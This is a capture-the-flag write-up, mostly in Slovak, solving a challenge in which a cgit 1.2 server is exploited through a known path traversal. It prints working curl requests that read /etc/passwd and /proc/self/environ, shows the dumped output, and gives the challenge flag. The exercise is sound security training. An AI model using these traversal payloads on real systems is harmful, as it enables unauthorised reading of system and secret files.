# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.
> 
> - The entry point to LORE is at [http://intro.lore.tcc](http://intro.lore.tcc "http://intro.lore.tcc").

> See you in the next incident!
> 
> **Hint1:**
> Be sure you enter flag for correct chapter.


----------

# Riešenie #

Na stránke intro máme 4 slajdy, každý pre kždú kapitolu. Každý obsahuje nejakú vetu, ktorá sa zdá byť nejakým dodatočným hintom

> [1 Travel](http://cgit.lore.tcc/ "1 Travel")
> 
> In the gentle sway,
> Seeking calm within the storm,
> A path unfolds clear.
> 
> Footsteps brave the tide,
> Guided by a steadfast light,
> Through trials we stride.

Navštívime stránku http://cgit.lore.tcc/, kde síce vidíme 

    			CGIT Source Control System
    This area is restricted to authorized personnel only.

ale v zdrojáku vidíme zakomentovaný odkaz na podstránku z repozotármi

    <p>Manage and browse your source code repositories with CGIT.</p>
    <a href="/cgit.cgi" class="button">Go to Repositories</a>

Vidíme tu repozitáre foo a sam-operator, po podrobnejšej analýze vidíme, že sa jedná o repozitár súvisiaci s úlohou 4 - Sam a zároveň vidíme, že sa bude pohybovať aj okolo kubernetes. Nikde nevidím žiadnu vlajku v commitoch, pozrel som všetko, čiastočne pochopil aj čo bude asi v poslednej úlohe, ale tým sa teraz zaťažovať nejdem. Čo ma však zaujalo najviac, je použitie zobrazenie gitu používaju nejaký cgit, o ktorom som doteraz ani nepočul. Zamerám sa na to, či neobsahuje nejaké známe zraniteľnosti, v päte webu vidíme aj verziu 1.2, čo nám snáď zuži množinu toho, čo skúšať.

Dáme do google cgit vulnerability a hneď prvý odkaz https://www.exploit-db.com/exploits/45148 nám napovedá, že je tam v tejto verzii zraniteľnosť vo forme path traversal na endpointe `/cgit.cgi/git/{repozitár}/?path=../../../../../../../etc/passwd`

    $ curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../../../etc/passwd

	root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

skúsime, či tu nie je súbor s vlajkou flag.txt, štandardne býva uložený v koreňovom priečinku /flag.txt, ale to nám vráti 404 - Not Found chybu... Skúsil som zadať rôzne cesty k valjky, ale žiadna neviedla k úspechu. Po dlhšom čase som skúsil nehľadať súbory ako také, ale ako som zistil, napríklad premenné prostredia dokážeme zobraziť pomocou cesty v súborovom systéme, konkrétne `/proc/self/environ`

	C:\Users\Majino\Documents\catch2024>curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../../../proc/self/environ                                                               Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" to save to a file.  

                                                                                                                                                                                                                    	C:\Users\Majino\Documents\catch2024>curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../../../proc/self/environ --output -                                                    FLAG=FLAG{FiqE-rPQL-pUV4-daQt}HTTP_HOST=cgit.lore.tccHTTP_X_REQUEST_ID=c829ae217cbf92049c2df4c1f9844c29HTTP_X_REAL_IP=10.200.0.13HTTP_X_FORWARDED_FOR=10.200.0.13HTTP_X_FORWARDED_HOST=cgit.lore.tccHTTP_X_FORWARDED_PORT=80HTTP_X_FORWARDED_PROTO=httpHTTP_X_FORWARDED_SCHEME=httpHTTP_X_SCHEME=httpHTTP_USER_AGENT=curl/8.9.1HTTP_ACCEPT=*/*PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binSERVER_SIGNATURE=<address>Apache/2.4.61 (Debian) Server at cgit.lore.tcc Port 80</address>                                                                                 SERVER_SOFTWARE=Apache/2.4.61 (Debian)SERVER_NAME=cgit.lore.tccSERVER_ADDR=192.168.73.67SERVER_PORT=80REMOTE_ADDR=192.168.73.113DOCUMENT_ROOT=/var/www/htmlREQUEST_SCHEME=httpCONTEXT_PREFIX=CONTEXT_DOCUMENT_ROOT=/var/www/htmlSERVER_ADMIN=[no address given]SCRIPT_FILENAME=/var/www/html/cgit.cgiREMOTE_PORT=50124GATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=path=../../../../../../../proc/self/environREQUEST_URI=/cgit.cgi/foo/objects/?path=../../../../../../../proc/self/environSCRIPT_NAME=/cgit.cgiPATH_INFO=/foo/objects/PATH_TRANSLATED=/var/www/html/foo/objects/ 

A tu vidíme vlajku

----------

## Vlajka ##
    FLAG{FiqE-rPQL-pUV4-daQt}